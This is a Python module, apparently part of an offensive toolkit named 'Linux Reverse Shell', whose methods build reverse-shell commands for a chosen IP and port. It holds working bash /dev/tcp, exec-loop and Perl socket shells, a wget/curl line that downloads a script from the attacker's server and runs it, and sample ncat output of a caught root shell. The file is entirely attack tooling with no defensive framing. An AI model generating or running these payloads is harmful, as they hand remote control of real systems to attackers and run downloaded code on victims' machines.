# encoding: utf8

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Linux Reverse Shell',
            'Author': 'whois',
            'Update': '2018/9/15',
        }

        self.desc_reverse = """
bash reverse shell
"""

        self.desc_exec_reverse = """
exec命令可以用来替代当前shell,也就是说并没有启动子shell，使用这一条命令时任何现有环境变量将会被清除，并重新启动一个shell
zsh不成功
"""
        self.desc_back = """
利用wget或curl从远程服务器下载反弹shell脚本，并执行\n
root@God /var/www # ncat -lvp 88       
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::88
Ncat: Listening on 0.0.0.0:88
Ncat: Connection from 1.1.1.1.
Ncat: Connection from 1.1.1.1:49301.
sh-3.2$ whoami
root
"""

    def bash_reverse(self, ip, port):
        return "bash -i >& /dev/tcp/{0}/{1} 0>&1".format(ip, port)

    def exec_reverse(self, ip, port):
        return "exec 5<>/dev/tcp/{0}/{1} && cat <&5 | while read line; do $line 2>&5 >&5; done".format(ip, port)

    def perl_reverse(self, ip, port):
        # 注意对{}的过滤，测试ok
        return "perl -e 'use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(ip, port)

    def wget_reverse(self, ip, port=88):
        return "wget http://{0}/back.py -P /tmp/;python /tmp/back.py {0} {1}\n\ncurl http://{0}/back2.py | python -".format(ip, port)


